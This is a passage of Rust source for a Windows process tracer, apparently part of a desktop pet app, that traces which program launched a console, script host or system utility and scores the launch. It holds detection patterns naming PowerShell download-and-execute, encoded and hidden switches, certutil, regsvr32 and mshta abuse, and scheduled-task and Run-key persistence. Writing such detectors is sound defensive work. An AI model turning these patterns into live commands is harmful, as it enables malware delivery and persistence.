// Process tracing: who launched that console window?
//
// A snapshot of the process table is diffed every 300 ms. When a shell, a
// script host or a known "living off the land" binary appears, its parent
// chain is resolved (with creation-time checks so a recycled PID is never
// blamed), the first non-shell ancestor is taken as the origin, and the
// launch is scored with simple, explainable heuristics. A WinEvent hook on
// console windows (native.rs → `console_shown`) catches consoles that flash
// and die between two snapshots.
//
// Privacy: the command line of a watched process is read once into memory to
// derive a few boolean flags ("hidden window", "encoded command", "downloads
// from the network") and is then dropped. It is never logged, persisted or
// shown. Nothing here modifies, suspends or kills any process.
use crate::storage::{self, enabled, State};
use serde::Serialize;
use serde_json::Value;
use std::{
    collections::{HashMap, HashSet, VecDeque},
    ffi::c_void,
    mem::size_of,
    ptr::null_mut,
    sync::{atomic::Ordering, Mutex},
    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
};
use tauri::Manager;
use windows_sys::Win32::{
    Foundation::{CloseHandle, FILETIME, HANDLE, HWND, INVALID_HANDLE_VALUE, LPARAM, BOOL},
    System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    },
    System::Threading::{
        GetCurrentProcessId, GetProcessTimes, OpenProcess, QueryFullProcessImageNameW,
        PROCESS_QUERY_LIMITED_INFORMATION,
    },
    UI::WindowsAndMessaging::{
        EnumWindows, GetForegroundWindow, GetWindowLongPtrW, GetWindowThreadProcessId,
        IsWindowVisible, GWL_EXSTYLE, WS_EX_TOOLWINDOW,
    },
};

#[derive(Clone, Serialize, Debug, Default)]
#[serde(rename_all = "camelCase")]
pub struct Proc {
    pub pid: u32,
    pub name: String,
    pub path: String,
    /// system | programs | appdata | temp | other | unknown
    pub location: String,
    /// None for Windows components (catalog-signed) and unreadable files.
    pub signed: Option<bool>,
    /// Human description for well-known Windows hosts ("служба Windows").
    pub role: String,
}

#[derive(Clone, Serialize, Debug)]
#[serde(rename_all = "camelCase")]
pub struct TraceEvent {
    pub id: u64,
    pub time: u64,
    pub first: u64,
    pub kind: String,
    pub child: Proc,
    pub origin: Option<Proc>,
    /// Names from the child upwards, e.g. ["powershell.exe","cmd.exe","updater.exe"].
    pub chain: Vec<String>,
    pub visible: bool,
    /// Exited before it could be inspected (a flash).
    pub flash: bool,
    pub flags: Vec<String>,
    pub score: u8,
    /// ok | notice | suspicious
    pub verdict: String,
    pub trusted: bool,
    pub repeat: u32,
    /// none | visible | background | alert — what the pet should say.
    pub speak: String,
    /// Interpreter between the child and the origin (python, node, …).
    #[serde(default)]
    pub via: Option<Proc>,
    /// Script that interpreter ran (path or "модуль x").
    #[serde(default)]
    pub script: String,
}

#[derive(Clone, Default)]
struct Known {
    name: String,
    ppid: u32,
    path: String,
    created: u64,
    gone: Option<Instant>,
    /// For interpreters: the script they were started with.
    script: String,
}

static LOG: Mutex<VecDeque<TraceEvent>> = Mutex::new(VecDeque::new());
static SHOWN: Mutex<Vec<(u32, u32, String, Instant)>> = Mutex::new(Vec::new());
const LOG_CAP: usize = 200;

pub const SHELLS: [&str; 10] = [
    "bash.exe",
    "sh.exe",
    "zsh.exe",
    "mintty.exe",
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "powershell_ise.exe",
    "conhost.exe",
    "openconsole.exe",
];
const HOSTS: [&str; 3] = ["windowsterminal.exe", "openconsole.exe", "conhost.exe"];
/// Runtimes that execute somebody else's code. The "real" culprit is the
/// script they run and whoever started them, so the origin search walks past
/// them and the script path is taken from their command line.
pub const INTERPRETERS: [&str; 17] = [
    "python.exe",
    "pythonw.exe",
    "py.exe",
    "pyw.exe",
    "node.exe",
    "bun.exe",
    "deno.exe",
    "java.exe",
    "javaw.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "ruby.exe",
    "perl.exe",
    "php.exe",
    "autohotkey.exe",
    "autohotkey64.exe",
];

/// The script or module an interpreter runs, from its command line. Only
/// that one argument is returned; the rest of the command line is dropped.
pub fn script_of(name: &str, cmd: &str) -> String {
    // Split respecting double quotes.
    let mut args: Vec<String> = vec![];
    let mut cur = String::new();
    let mut quoted = false;
    for ch in cmd.chars() {
        match ch {
            '"' => quoted = !quoted,
            c if c.is_whitespace() && !quoted => {
                if !cur.is_empty() {
                    args.push(std::mem::take(&mut cur));
                }
            }
            c => cur.push(c),
        }
    }
    if !cur.is_empty() {
        args.push(cur);
    }
    let rest = &args[1.min(args.len())..];
    let py = name.starts_with("python") || name.starts_with("py");
    let mut i = 0;
    while i < rest.len() {
        let a = rest[i].as_str();
        let l = a.to_lowercase();
        if py && (l == "-c") {
            return "(код прямо в командной строке)".into();
        }
        if py && l == "-m" {
            return rest.get(i + 1).map(|m| format!("модуль {m}")).unwrap_or_default();
        }
        if (name == "node.exe" || name == "bun.exe" || name == "deno.exe") && (l == "-e" || l == "--eval" || l == "-p") {
            return "(код прямо в командной строке)".into();
        }
        if name.starts_with("java") && l == "-jar" {
            return rest.get(i + 1).cloned().unwrap_or_default();
        }
        if name.starts_with("java") && (l == "-cp" || l == "-classpath") {
            i += 2;
            continue;
        }
        if name == "mshta.exe" {
            return a.to_string();
        }
        if a.starts_with('-') || (a.starts_with('/') && a.len() <= 3) {
            // python -X opt / -W arg take a value
            if py && (l == "-x" || l == "-w") {
                i += 1;
            }
            i += 1;
            continue;
        }
        return a.to_string();
    }
    String::new()
}
const SCRIPT_HOSTS: [&str; 3] = ["wscript.exe", "cscript.exe", "mshta.exe"];
const LOLBINS: [&str; 8] = [
    "certutil.exe",
    "bitsadmin.exe",
    "regsvr32.exe",
    "rundll32.exe",
    "wmic.exe",
    "schtasks.exe",
    "reg.exe",
    "msbuild.exe",
];
const OFFICE: [&str; 6] = [
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
    "outlook.exe",
    "onenote.exe",
    "mspub.exe",
];
const BROWSERS: [&str; 7] = [
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "opera.exe",
    "brave.exe",
    "vivaldi.exe",
    "yandex.exe",
];
/// Origins that launch shells all day long on a developer machine. Their
/// launches are logged but never spoken, unless the heuristics flag them.
pub const DEFAULT_TRUSTED: [&str; 12] = [
    "explorer.exe",
    "code.exe",
    "cursor.exe",
    "devenv.exe",
    "idea64.exe",
    "rider64.exe",
    "pycharm64.exe",
    "claude.exe",
    "windowsterminal.exe",
    "node.exe",
    "git.exe",
    "msbuild.exe",
];

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_millis() as u64
}

pub fn kind_of(name: &str) -> Option<&'static str> {
    if ["cmd.exe", "powershell.exe", "pwsh.exe", "powershell_ise.exe"].contains(&name) {
        Some("console")
    } else if SCRIPT_HOSTS.contains(&name) {
        Some("script")
    } else if LOLBINS.contains(&name) {
        Some("tool")
    } else {
        None
    }
}

pub fn role_of(name: &str) -> &'static str {
    match name {
        "svchost.exe" => "служба Windows",
        "services.exe" => "диспетчер служб Windows",
        "taskhostw.exe" | "taskeng.exe" => "планировщик заданий",
        "wmiprvse.exe" => "WMI (удалённое управление Windows)",
        "explorer.exe" => "Проводник — то есть ты сам",
        "runtimebroker.exe" => "посредник приложений Windows",
        "msiexec.exe" => "установщик Windows",
        "wininit.exe" | "winlogon.exe" | "userinit.exe" => "запуск Windows",
        _ => "",
    }
}

pub fn location_of(path: &str) -> &'static str {
    let p = path.to_lowercase();
    if p.is_empty() {
        return "unknown";
    }
    let windir = std::env::var("SystemRoot")
        .unwrap_or_else(|_| "C:\\Windows".into())
        .to_lowercase();
    if p.starts_with(&(windir + "\\")) {
        "system"
    } else if p.contains("\\program files\\") || p.contains("\\program files (x86)\\") {
        "programs"
    } else if p.contains("\\temp\\") || p.contains("\\downloads\\") || p.contains("\\tmp\\") {
        "temp"
    } else if p.contains("\\appdata\\") || p.contains("\\programdata\\") {
        "appdata"
    } else {
        "other"
    }
}

/// Flags derived from a command line. The text itself is not kept.
pub fn command_flags(child: &str, cmd: &str) -> Vec<&'static str> {
    let c = cmd.to_lowercase();
    let tokens: Vec<&str> = c.split_whitespace().collect();
    let mut f = vec![];
    let ps = ["powershell.exe", "pwsh.exe", "powershell_ise.exe"].contains(&child);
    if ps {
        let has = |t: &str| tokens.iter().any(|x| *x == t);
        if tokens.iter().any(|t| {
            *t == "-e" || *t == "-ec" || t.starts_with("-enc") || *t == "/enc" || *t == "-en"
        }) {
            f.push("encoded");
        }
        let w = tokens.iter().position(|t| {
            *t == "-w" || *t == "-win" || t.starts_with("-window")
        });
        if let Some(i) = w {
            if tokens.get(i + 1).map_or(false, |v| v.starts_with("hid") || *v == "1") {
                f.push("hidden");
            }
        }
        if (has("-ep") || tokens.iter().any(|t| t.starts_with("-ex")))
            && c.contains("bypass")
        {
            f.push("bypass");
        }
        if c.contains("iex ") || c.contains("iex(") || c.contains("|iex") || c.ends_with(" iex") || c.contains("invoke-expression") {
            f.push("exec-string");
        }
        if c.contains("frombase64string") {
            f.push("decode");
        }
    }
    if c.contains("http://")
        || c.contains("https://")
        || c.contains("downloadstring")
        || c.contains("downloadfile")
        || c.contains("invoke-webrequest")
        || c.contains("start-bitstransfer")
        || c.contains(" iwr ")
        || c.contains("net.webclient")
    {
        f.push("network");
    }
    match child {
        "certutil.exe" if c.contains("-urlcache") || c.contains("-decode") => f.push("lolbin"),
        "bitsadmin.exe" if c.contains("/transfer") => f.push("lolbin"),
        "regsvr32.exe" if c.contains("/i:") || c.contains("scrobj") => f.push("lolbin"),
        "rundll32.exe" if c.contains("javascript:") || c.contains("url.dll") => f.push("lolbin"),
        "mshta.exe" if c.contains("javascript:") || c.contains("vbscript:") => f.push("lolbin"),
        "schtasks.exe" if c.contains("/create") => f.push("persistence"),
        "reg.exe" if c.contains(" add ") && c.contains("\\run") => f.push("persistence"),
        "wmic.exe" if c.contains("process call create") => f.push("lolbin"),
        _ => {}
    }
    f
}

#[allow(dead_code)]
pub fn flag_label(flag: &str) -> &'static str {
    match flag {
        "encoded" => "закодированная команда",
        "hidden" => "скрытое окно",
        "bypass" => "обход политики скриптов",
        "exec-string" => "выполнение строки как кода",
        "decode" => "декодирование base64",
        "network" => "обращение в сеть",
        "lolbin" => "системная утилита в нетипичной роли",
        "persistence" => "автозапуск / задача планировщика",
        "office-parent" => "запущено из Office",
        "browser-parent" => "запущено из браузера",
        "temp-origin" => "источник во временной папке / Загрузках",
        "appdata-origin" => "источник в AppData",
        "unsigned-origin" => "источник без цифровой подписи",
        "background" => "без окна (в фоне)",
        "flash" => "мелькнуло и закрылось",
        _ => "",
    }
}

/// Score a launch. Returns (score, all flags, verdict).
pub fn assess(
    child: &str,
    cmd_flags: &[&str],
    origin: Option<&Proc>,
    visible: bool,
    flash: bool,
) -> (u8, Vec<String>, &'static str) {
    let mut score = 0u8;
    let mut flags: Vec<String> = vec![];
    let mut add = |flag: &str, w: u8| {
        if !flags.iter().any(|f| f == flag) {
            flags.push(flag.to_string());
            score = score.saturating_add(w);
        }
    };
    for f in cmd_flags {
        let w = match *f {
            "encoded" => 3,
            "hidden" => 2,
            "bypass" => 1,
            "exec-string" => 2,
            "decode" => 1,
            "network" => 2,
            "lolbin" => 3,
            "persistence" => 3,
            _ => 0,
        };
        add(f, w);
    }
    if let Some(o) = origin {
        if OFFICE.contains(&o.name.as_str()) {
            add("office-parent", 3);
        }
        if BROWSERS.contains(&o.name.as_str()) && kind_of(child) != Some("tool") {
            add("browser-parent", 2);
        }
        match o.location.as_str() {
            "temp" => add("temp-origin", 2),
            "appdata" if o.signed == Some(false) => add("appdata-origin", 1),
            _ => {}
        }
        if o.signed == Some(false) && !["system", "programs"].contains(&o.location.as_str()) {
            add("unsigned-origin", 1);
        }
    }
    if !visible && kind_of(child) == Some("console") {
        add("background", 0);
    }
    if flash {
        add("flash", 0);
    }
    let verdict = if score >= 4 {
        "suspicious"
    } else if score >= 2 {
        "notice"
    } else {
        "ok"
    };
    (score, flags, verdict)
}

// ---------------------------------------------------------------- Win32 bits

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(Some(0)).collect()
}

unsafe fn image_path(h: HANDLE) -> String {
    let mut buf = [0u16; 1024];
    let mut len = buf.len() as u32;
    if QueryFullProcessImageNameW(h, 0, buf.as_mut_ptr(), &mut len) != 0 {
        String::from_utf16_lossy(&buf[..len as usize])
    } else {
        String::new()
    }
}

unsafe fn created(h: HANDLE) -> u64 {
    let mut c: FILETIME = std::mem::zeroed();
    let mut e = c;
    let mut k = c;
    let mut u = c;
    if GetProcessTimes(h, &mut c, &mut e, &mut k, &mut u) != 0 {
        ((c.dwHighDateTime as u64) << 32) | c.dwLowDateTime as u64
    } else {
        0
    }
}

#[link(name = "ntdll")]
extern "system" {
    fn NtQueryInformationProcess(
        handle: HANDLE,
        class: u32,
        info: *mut c_void,
        length: u32,
        returned: *mut u32,
    ) -> i32;
}

/// Command line of another process (Windows 8.1+: ProcessCommandLineInformation).
unsafe fn command_line(h: HANDLE) -> Option<String> {
    let mut need = 0u32;
    NtQueryInformationProcess(h, 60, null_mut(), 0, &mut need);
    if need == 0 || need > 64 * 1024 {
        return None;
    }
    let mut buf = vec![0u64; (need as usize + 7) / 8];
    if NtQueryInformationProcess(h, 60, buf.as_mut_ptr() as _, need, &mut need) < 0 {
        return None;
    }
    #[repr(C)]
    struct Unicode {
        length: u16,
        maximum: u16,
        buffer: *const u16,
    }
    let u = &*(buf.as_ptr() as *const Unicode);
    if u.buffer.is_null() {
        return None;
    }
    let text = std::slice::from_raw_parts(u.buffer, u.length as usize / 2);
    Some(String::from_utf16_lossy(text))
}

pub fn signed(path: &str, cache: &mut HashMap<String, Option<bool>>) -> Option<bool> {
    if path.is_empty() || location_of(path) == "system" {
        return None;
    }
    if let Some(v) = cache.get(path) {
        return *v;
    }
    use windows_sys::Win32::Security::WinTrust::*;
    let w = wide(path);
    let result = unsafe {
        let mut file = WINTRUST_FILE_INFO {
            cbStruct: size_of::<WINTRUST_FILE_INFO>() as u32,
            pcwszFilePath: w.as_ptr(),
            hFile: null_mut(),
            pgKnownSubject: null_mut(),
        };
        let mut data: WINTRUST_DATA = std::mem::zeroed();
        data.cbStruct = size_of::<WINTRUST_DATA>() as u32;
        data.dwUIChoice = WTD_UI_NONE;
        data.fdwRevocationChecks = WTD_REVOKE_NONE;
        data.dwUnionChoice = WTD_CHOICE_FILE;
        data.Anonymous.pFile = &mut file;
        data.dwStateAction = WTD_STATEACTION_VERIFY;
        data.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
        let mut action = WINTRUST_ACTION_GENERIC_VERIFY_V2;
        let r = WinVerifyTrust(null_mut(), &mut action, &mut data as *mut _ as _);
        data.dwStateAction = WTD_STATEACTION_CLOSE;
        WinVerifyTrust(null_mut(), &mut action, &mut data as *mut _ as _);
        r
    };
    let v = if std::path::Path::new(path).exists() {
        Some(result == 0)
    } else {
        None
    };
    if cache.len() > 500 {
        cache.clear();
    }
    cache.insert(path.to_string(), v);
    v
}

fn snapshot() -> Vec<(u32, u32, String)> {
    let mut out = vec![];
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE {
            return out;
        }
        let mut e: PROCESSENTRY32W = std::mem::zeroed();
        e.dwSize = size_of::<PROCESSENTRY32W>() as u32;
        if Process32FirstW(snap, &mut e) != 0 {
            loop {
                let n = e.szExeFile.iter().position(|c| *c == 0).unwrap_or(260);
                out.push((
                    e.th32ProcessID,
                    e.th32ParentProcessID,
                    String::from_utf16_lossy(&e.szExeFile[..n]).to_lowercase(),
                ));
                if Process32NextW(snap, &mut e) == 0 {
                    break;
                }
            }
        }
        CloseHandle(snap);
    }
    out
}

fn visible_pids() -> HashSet<u32> {
    unsafe extern "system" fn each(w: HWND, data: LPARAM) -> BOOL {
        let set = &mut *(data as *mut HashSet<u32>);
        if IsWindowVisible(w) != 0
            && GetWindowLongPtrW(w, GWL_EXSTYLE) & WS_EX_TOOLWINDOW as isize == 0
        {
            let mut pid = 0;
            GetWindowThreadProcessId(w, &mut pid);
            set.insert(pid);
        }
        1
    }
    let mut set = HashSet::new();
    unsafe {
        EnumWindows(Some(each), &mut set as *mut _ as isize);
    }
    set
}

/// Called from the WinEvent hook when a console window is shown. Resolves
/// the parent immediately, because the process may be gone 50 ms later.
pub fn console_shown(pid: u32) {
    let list = snapshot();
    let ppid = list.iter().find(|p| p.0 == pid).map(|p| p.1).unwrap_or(0);
    let name = list
        .iter()
        .find(|p| p.0 == pid)
        .map(|p| p.2.clone())
        .unwrap_or_default();
    if let Ok(mut s) = SHOWN.lock() {
        s.push((pid, ppid, name, Instant::now()));
        if s.len() > 64 {
            s.remove(0);
        }
    }
}

// ------------------------------------------------------------------- tracer

struct Pending {
    pid: u32,
    since: Instant,
    kind: &'static str,
    flags: Vec<&'static str>,
    shown: bool,
}

struct Tracer {
    known: HashMap<u32, Known>,
    pending: Vec<Pending>,
    signatures: HashMap<String, Option<bool>>,
    spoken: HashMap<String, Instant>,
    terminal_fg: Option<Instant>,
    last_fg: u32,
    own: u32,
    next_id: u64,
}

impl Tracer {
    fn proc_of(&mut self, pid: u32) -> Proc {
        let k = self.known.get(&pid).cloned().unwrap_or_default();
        let location = location_of(&k.path).to_string();
        let signed = signed(&k.path, &mut self.signatures);
        Proc {
            pid,
            role: role_of(&k.name).to_string(),
            name: k.name,
            path: k.path,
            location,
            signed,
        }
    }
    /// Parent chain with PID-reuse protection: a parent must have been
    /// created before its child.
    fn chain(&self, pid: u32) -> Vec<u32> {
        let mut out = vec![pid];
        let mut cur = pid;
        for _ in 0..8 {
            let Some(k) = self.known.get(&cur) else { break };
            let Some(parent) = self.known.get(&k.ppid) else { break };
            if k.ppid == 0 || k.ppid == cur || (parent.created != 0 && k.created != 0 && parent.created > k.created) {
                break;
            }
            out.push(k.ppid);
            cur = k.ppid;
        }
        out
    }
    fn learn(&mut self, pid: u32, ppid: u32, name: &str) -> bool {
        if let Some(k) = self.known.get_mut(&pid) {
            if k.name == name {
                k.gone = None;
                return false;
            }
        }
        let mut k = Known {
            name: name.to_string(),
            ppid,
            ..Default::default()
        };
        unsafe {
            let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
            if !h.is_null() {
                k.path = image_path(h);
                k.created = created(h);
                if INTERPRETERS.contains(&name) {
                    k.script = command_line(h).map(|c| script_of(name, &c)).unwrap_or_default();
                }
                CloseHandle(h);
            }
        }
        self.known.insert(pid, k);
        true
    }
    fn read_flags(pid: u32, name: &str) -> Vec<&'static str> {
        unsafe {
            let h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid);
            if h.is_null() {
                return vec![];
            }
            let flags = command_line(h).map(|c| command_flags(name, &c)).unwrap_or_default();
            CloseHandle(h);
            flags
        }
    }
}

fn setting_list(settings: &Value, key: &str) -> Vec<String> {
    settings
        .get(key)
        .and_then(Value::as_array)
        .map(|a| {
            a.iter()
                .filter_map(Value::as_str)
                .map(|s| s.trim().to_lowercase())
                .collect()
        })
        .unwrap_or_default()
}

fn log_path() -> std::path::PathBuf {
    storage::root().join("trace.json")
}

fn persist_log() {
    let items: Vec<TraceEvent> = LOG.lock().map(|l| l.iter().cloned().collect()).unwrap_or_default();
    if let Ok(bytes) = serde_json::to_vec(&items) {
        let _ = std::fs::create_dir_all(storage::root());
        let tmp = storage::root().join("trace.next.json");
        if std::fs::write(&tmp, bytes).is_ok() {
            let _ = std::fs::rename(&tmp, log_path());
        }
    }
}

pub fn load_log() {
    #[derive(serde::Deserialize)]
    struct Loose {
        #[serde(flatten)]
        v: Value,
    }
    let Ok(bytes) = std::fs::read(log_path()) else { return };
    let Ok(items) = serde_json::from_slice::<Vec<Loose>>(&bytes) else { return };
    // Stored events are re-validated field by field: an old or damaged file
    // just loses the entries that no longer parse.
    let mut log = LOG.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    for item in items.into_iter().rev().take(LOG_CAP).rev() {
        if let Ok(e) = serde_json::from_value::<TraceEventIn>(item.v) {
            log.push_back(e.into());
        }
    }
}

#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct ProcIn {
    pid: u32,
    name: String,
    path: String,
    location: String,
    signed: Option<bool>,
    #[serde(default)]
    role: String,
}
#[derive(serde::Deserialize)]
#[serde(rename_all = "camelCase")]
struct TraceEventIn {
    id: u64,
    time: u64,
    #[serde(default)]
    first: u64,
    kind: String,
    child: ProcIn,
    origin: Option<ProcIn>,
    chain: Vec<String>,
    visible: bool,
    flash: bool,
    flags: Vec<String>,
    score: u8,
    verdict: String,
    trusted: bool,
    repeat: u32,
    #[serde(default)]
    via: Option<ProcIn>,
    #[serde(default)]
    script: String,
}
impl From<ProcIn> for Proc {
    fn from(p: ProcIn) -> Self {
        Proc { pid: p.pid, name: p.name, path: p.path, location: p.location, signed: p.signed, role: p.role }
    }
}
impl From<TraceEventIn> for TraceEvent {
    fn from(e: TraceEventIn) -> Self {
        TraceEvent {
            id: e.id,
            time: e.time,
            first: if e.first == 0 { e.time } else { e.first },
            kind: e.kind,
            child: e.child.into(),
            origin: e.origin.map(Into::into),
            chain: e.chain,
            visible: e.visible,
            flash: e.flash,
            flags: e.flags,
            score: e.score,
            verdict: e.verdict,
            trusted: e.trusted,
            repeat: e.repeat,
            speak: "none".into(),
            via: e.via.map(Into::into),
            script: e.script,
        }
    }
}

pub fn log() -> Vec<TraceEvent> {
    LOG.lock().map(|l| l.iter().rev().cloned().collect()).unwrap_or_default()
}

pub fn clear() {
    if let Ok(mut l) = LOG.lock() {
        l.clear();
    }
    let _ = std::fs::remove_file(log_path());
}

/// Adds an event, merging repeats of the same launch pattern (same origin
/// executable, same child, same visibility and verdict) within 10 minutes.
/// Returns the stored event and whether it was new.
fn record(mut e: TraceEvent) -> (TraceEvent, bool) {
    let mut log = LOG.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
    let key = |x: &TraceEvent| {
        (
            x.origin.as_ref().map(|o| o.path.to_lowercase()).unwrap_or_default(),
            x.child.name.clone(),
            x.visible,
            x.verdict.clone(),
        )
    };
    if let Some(prev) = log
        .iter_mut()
        .rev()
        .take(30)
        .find(|p| key(p) == key(&e) && e.time.saturating_sub(p.time) < 600_000)
    {
        prev.repeat += 1;
        prev.time = e.time;
        prev.child.pid = e.child.pid;
        let merged = prev.clone();
        drop(log);
        return (merged, false);
    }
    e.first = e.time;
    log.push_back(e.clone());
    while log.len() > LOG_CAP {
        log.pop_front();
    }
    (e, true)
}

pub fn start(app: tauri::AppHandle) {
    load_log();
    std::thread::spawn(move || {
        let mut t = Tracer {
            known: HashMap::new(),
            pending: vec![],
            signatures: HashMap::new(),
            spoken: HashMap::new(),
            terminal_fg: None,
            last_fg: 0,
            own: unsafe { GetCurrentProcessId() },
            next_id: now_ms(),
        };
        let mut primed = false;
        let mut dirty_log = false;
        let mut last_persist = Instant::now();
        while !app.state::<State>().stop.load(Ordering::Relaxed) {
            let settings = app.state::<State>().store.lock().unwrap_or_else(std::sync::PoisonError::into_inner).settings.clone();
            if !enabled(&settings, "observeProcesses", true) {
                primed = false;
                t.known.clear();
                t.pending.clear();
                std::thread::sleep(Duration::from_secs(2));
                continue;
            }
            // 1. Diff the process table.
            let list = snapshot();
            let alive: HashSet<u32> = list.iter().map(|p| p.0).collect();
            for (pid, ppid, name) in &list {
                let fresh = t.learn(*pid, *ppid, name);
                if fresh && primed {
                    if let Some(kind) = kind_of(name) {
                        let flags = Tracer::read_flags(*pid, name);
                        // Background tools (rundll32 & co.) run all the time;
                        // only an unusual command line makes them interesting.
                        if kind != "tool" || !flags.is_empty() {
                            t.pending.push(Pending { pid: *pid, since: Instant::now(), kind, flags, shown: false });
                        }
                    } else if location_of(&t.known[pid].path) == "temp"
                        && !["msiexec.exe", "conhost.exe"].contains(&name.as_str())
                    {
                        t.pending.push(Pending { pid: *pid, since: Instant::now(), kind: "temp-exe", flags: vec![], shown: false });
                    }
                }
            }
            let now = Instant::now();
            for (pid, k) in t.known.iter_mut() {
                if !alive.contains(pid) && k.gone.is_none() {
                    k.gone = Some(now);
                }
            }
            // Dead processes stay a minute so fast chains can still be walked.
            t.known.retain(|_, k| k.gone.map_or(true, |g| g.elapsed() < Duration::from_secs(60)));
            primed = true;

            // 2. Terminal host brought to the foreground (Windows Terminal as
            //    the default console on Windows 11 owns the window, not cmd).
            unsafe {
                let fg = GetForegroundWindow();
                let mut pid = 0;
                GetWindowThreadProcessId(fg, &mut pid);
                if pid != t.last_fg {
                    t.last_fg = pid;
                    if t.known.get(&pid).map_or(false, |k| HOSTS.contains(&k.name.as_str())) {
                        t.terminal_fg = Some(Instant::now());
                    }
                }
            }
            // 3. Consoles reported by the WinEvent hook.
            let shown: Vec<_> = SHOWN.lock().map(|mut s| s.drain(..).collect()).unwrap_or_default();
            for (pid, ppid, name, _) in shown {
                if let Some(p) = t.pending.iter_mut().find(|p| p.pid == pid) {
                    p.shown = true;
                } else if kind_of(&name).is_some() && !t.known.contains_key(&pid) {
                    // Came and went between two snapshots.
                    t.known.insert(pid, Known { name: name.clone(), ppid, gone: Some(Instant::now()), ..Default::default() });
                    t.pending.push(Pending { pid, since: Instant::now() - Duration::from_secs(5), kind: "console", flags: vec![], shown: true });
                }
            }

            // 4. Settle launches older than 1.2 s.
            let ready: Vec<Pending> = {
                let (r, keep): (Vec<_>, Vec<_>) = t.pending.drain(..).partition(|p| p.since.elapsed() >= Duration::from_millis(1200));
                t.pending = keep;
                r
            };
            if !ready.is_empty() {
                let windows = visible_pids();
                let trusted: Vec<String> = setting_list(&settings, "traceTrusted")
                    .into_iter()
                    .chain(DEFAULT_TRUSTED.iter().map(|s| s.to_string()))
                    .collect();
                for p in ready {
                    let chain = t.chain(p.pid);
                    if chain.contains(&t.own) {
                        continue;
                    }
                    let flash = !alive.contains(&p.pid);
                    // Console windows belong to conhost children of the shell.
                    let conhosts: Vec<u32> = t
                        .known
                        .iter()
                        .filter(|(_, k)| k.ppid == p.pid && k.name == "conhost.exe")
                        .map(|(pid, _)| *pid)
                        .collect();
                    let terminal = t.terminal_fg.map_or(false, |at| {
                        let since = p.since.elapsed();
                        let ago = at.elapsed();
                        ago <= since + Duration::from_millis(500)
                    });
                    let visible = p.shown
                        || windows.contains(&p.pid)
                        || conhosts.iter().any(|c| windows.contains(c))
                        || (p.kind == "console" && terminal);
                    let origin_pid = chain
                        .iter()
                        .skip(1)
                        .find(|pid| t.known.get(pid).map_or(false, |k| !SHELLS.contains(&k.name.as_str()) && !HOSTS.contains(&k.name.as_str()) && !INTERPRETERS.contains(&k.name.as_str())))
                        .copied();
                    // The nearest interpreter between the child and the origin
                    // (or the child itself when it is one, e.g. wscript).
                    let via_pid = chain
                        .iter()
                        .take_while(|pid| Some(**pid) != origin_pid)
                        .find(|pid| t.known.get(pid).map_or(false, |k| INTERPRETERS.contains(&k.name.as_str())))
                        .copied();
                    let script = via_pid.and_then(|pid| t.known.get(&pid)).map(|k| k.script.clone()).unwrap_or_default();
                    let via = via_pid.filter(|pid| *pid != p.pid).map(|pid| t.proc_of(pid));
                    let child = t.proc_of(p.pid);
                    let origin = origin_pid.map(|pid| t.proc_of(pid));
                    let names: Vec<String> = chain
                        .iter()
                        .filter_map(|pid| t.known.get(pid).map(|k| k.name.clone()))
                        .collect();
                    let (score, flags, verdict) = assess(&child.name, &p.flags, origin.as_ref(), visible, flash);
                    let origin_name = origin.as_ref().map(|o| o.name.clone()).unwrap_or_default();
                    let is_trusted = trusted.contains(&origin_name);
                    // What the pet says: suspicious always (5 min per pattern),
                    // a visible console from an untrusted origin (20 s), a
                    // background one at most once per origin per 2 hours.
                    let pattern = format!("{}>{}", origin_name, child.name);
                    let spoke_ago = |k: &str, t: &Tracer| t.spoken.get(k).map(|i| i.elapsed());
                    let speak = if verdict == "suspicious" {
                        if spoke_ago(&format!("alert:{pattern}"), &t).map_or(true, |d| d > Duration::from_secs(300)) { "alert" } else { "none" }
                    } else if is_trusted || p.kind == "tool" || p.kind == "temp-exe" {
                        "none"
                    } else if visible {
                        if spoke_ago(&format!("visible:{origin_name}"), &t).map_or(true, |d| d > Duration::from_secs(20)) { "visible" } else { "none" }
                    } else if enabled(&settings, "traceBackground", true)
                        && spoke_ago(&format!("background:{origin_name}"), &t).map_or(true, |d| d > Duration::from_secs(7200))
                    {
                        "background"
                    } else {
                        "none"
                    };
                    match speak {
                        "alert" => { t.spoken.insert(format!("alert:{pattern}"), Instant::now()); }
                        "visible" => { t.spoken.insert(format!("visible:{origin_name}"), Instant::now()); }
                        "background" => { t.spoken.insert(format!("background:{origin_name}"), Instant::now()); }
                        _ => {}
                    }
                    t.next_id += 1;
                    let event = TraceEvent {
                        id: t.next_id,
                        time: now_ms(),
                        first: 0,
                        kind: p.kind.to_string(),
                        child,
                        origin,
                        chain: names,
                        visible,
                        flash,
                        flags,
                        score,
                        verdict: verdict.to_string(),
                        trusted: is_trusted,
                        repeat: 1,
                        speak: speak.to_string(),
                        via,
                        script,
                    };
                    if storage::diag_enabled(&settings) {
                        storage::diag("trace", &format!("{} <- {} pids {:?} visible {} flash {} score {} {} speak {}", event.child.name, event.chain.join(" <- "), chain, visible, flash, score, verdict, speak));
                    }
                    let (mut stored, _) = record(event);
                    stored.speak = speak.to_string();
                    dirty_log = true;
                    if let Some(pet) = app.get_window("pet") {
                        let _ = pet.emit("trace", stored.clone());
                    }
                    if let Some(panel) = app.get_window("settings") {
                        let _ = panel.emit("trace", stored);
                    }
                }
            }
            if dirty_log && last_persist.elapsed() > Duration::from_secs(5) {
                persist_log();
                dirty_log = false;
                last_persist = Instant::now();
            }
            std::thread::sleep(Duration::from_millis(300));
        }
        if dirty_log {
